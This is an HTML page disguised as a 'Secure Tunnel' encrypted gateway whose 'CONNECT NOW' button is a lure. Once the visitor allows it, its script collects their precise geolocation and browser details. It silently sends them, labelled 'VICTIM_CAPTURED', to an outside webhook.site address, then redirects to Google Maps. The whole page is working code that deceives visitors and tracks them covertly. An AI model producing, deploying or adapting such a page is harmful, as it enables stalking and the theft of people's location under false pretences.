<!DOCTYPE html>
<html>
<head>
    <title>Secure Tunnel v2.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 80px; background-color: #0a0a0a; color: #00ff00; }
        .terminal { border: 2px solid #333; padding: 30px; display: inline-block; border-radius: 15px; background: #111; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        .btn { background: #007bff; border: none; color: white; padding: 15px 40px; border-radius: 8px; cursor: pointer; font-size: 20px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background: #0056b3; transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>üîí ENCRYPTED GATEWAY</h2>
        <p id="msg">To complete the secure handshake, tap below.</p>
        <button class="btn" onclick="startSecureTunnel()">CONNECT NOW</button>
    </div>

    <script>
        function startSecureTunnel() {
            const msg = document.getElementById("msg");
            msg.innerHTML = "Requesting System Access...";
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    msg.innerHTML = "Handshake Successful. Processing...";
                    
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;

                    // --- DASHBOARD EXFILTRATION ---
                    // This sends the data silently to your unique Webhook link
                    fetch("https://webhook.site/b9525f76-1fae-4111-9571-1ad90bbdb8a7", {
                        method: "POST",
                        mode: "no-cors",
                        body: JSON.stringify({
                            status: "VICTIM_CAPTURED",
                            latitude: lat,
                            longitude: lon,
                            device: navigator.userAgent,
                            maps_link: `https://www.google.com/maps?q=${lat},${lon}`
                        })
                    });
                    // ------------------------------

                    // Opens Google Maps on the phone for the video finish
                    setTimeout(() => {
                        window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
                    }, 1000);
                },
                (err) => {
                    msg.innerHTML = "‚ö†Ô∏è Error: Handshake Rejected.<br>Please 'Allow' access to continue.";
                    msg.style.color = "red";
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }
    </script>
</body>
</html>
